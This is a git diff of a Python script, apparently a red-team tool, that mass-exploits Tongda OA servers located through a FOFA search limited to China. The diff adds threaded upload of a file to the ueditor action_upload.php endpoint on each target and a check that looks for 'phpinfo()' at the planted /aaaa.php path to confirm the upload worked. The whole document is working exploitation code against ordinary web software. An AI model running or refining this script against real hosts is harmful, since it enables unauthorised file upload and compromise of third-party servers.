@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # _*_ coding:utf-8 _*_
 # Author : Noth
-# Time : 2023-8-9
+# Time : 2023-8-10
 # fofa : app="TDXK-通达OA" && country="CN"
 
 import os
@@ -12,6 +12,7 @@ import requests
 from bs4 import BeautifulSoup
 from threading import *
 import threading
+from concurrent.futures import ThreadPoolExecutor
 
 # 定義並發線程數
 
@@ -55,7 +56,37 @@ if url_200:
         for result in url_200:
             f.write(result + '\n')
 
-# 執行 PoC，請求 200 的 URL 輸入成 result-tdxk-sucess_200.txt
+# 成功上傳放入到列表中
+
+upload_sucess_url = []
+
+# 利用phpinfo()字串判斷是否上傳成功
+
+try:
+    with open('C:\\Users\\user\\Desktop\\RedTeam\\X-Fofa\\result-tdxk-sucess_200.txt') as file:
+        upload_url = file.readlines()
+        for upload_url_real in upload_url:
+            uploadsucess_url = upload_url_real.strip()
+            try:
+                r = requests.get(url=uploadsucess_url,timeout=15)
+                if r.status_code == 200 and 'phpinfo()' in r.text:
+                    print(f"上傳成功，路徑: {uploadsucess_url}/aaaa.php")
+                    upload_sucess_url.append(uploadsucess_url)
+                else:
+                    print(f"{uploadsucess_url} not sucessful")
+            except requests.exceptions.RequestException as e:
+                print(f"出現異常跳過此URL: {uploadsucess_url}")
+                continue
+except:
+    pass
+
+# 將成功上傳的 url 存成 upload_result-tdxk-sucess_200.txt
+
+with open('upload_result-tdxk-sucess_200.txt', 'w') as f:
+    for url in upload_sucess_url:
+        f.write(url + '\n')
+
+# 執行 PoC，將請求 200 的 URL 輸入成 result-tdxk-sucess_200.txt
 
 def exp(line) :
     host = line + "/module/ueditor/php/action_upload.php?action=uploadfile"
@@ -67,7 +98,6 @@ def exp(line) :
                 with open('result-tdxk-sucess_200.txt','a') as f:
                     f.write(line + '/aaaa.php\n')
                     print(f"成功上傳 : {line}/aaaa.php")
-                    print('OK')
         else:
             print(f"上傳失敗 {line}")
     except Exception as e:
@@ -117,8 +147,15 @@ headers = {
 
 # 打開狀態碼 200 URL
 
-with open('C:\\Users\\user\\Desktop\\RedTeam\\X-Fofa\\tdxk_sucess_200.txt','r') as f:
+with open('C:\\Users\\user\\Desktop\\RedTeam\\X-Fofa\\tdxk_sucess_200.txt', 'r') as f:
     urls = f.readlines()
-    for url_200_test in urls:
-        line = url_200_test.strip()
-        exp(line)
+    with tqdm(total=len(urls), desc="Uploading URLs") as pbar:
+        futures = []
+        for url_200_test in urls:
+            line = url_200_test.strip()
+            t = threading.Thread(target=exp, args=(line,))
+            t.start()
+            t.join()
+            pbar.update()
+
+print("Upload completed!")
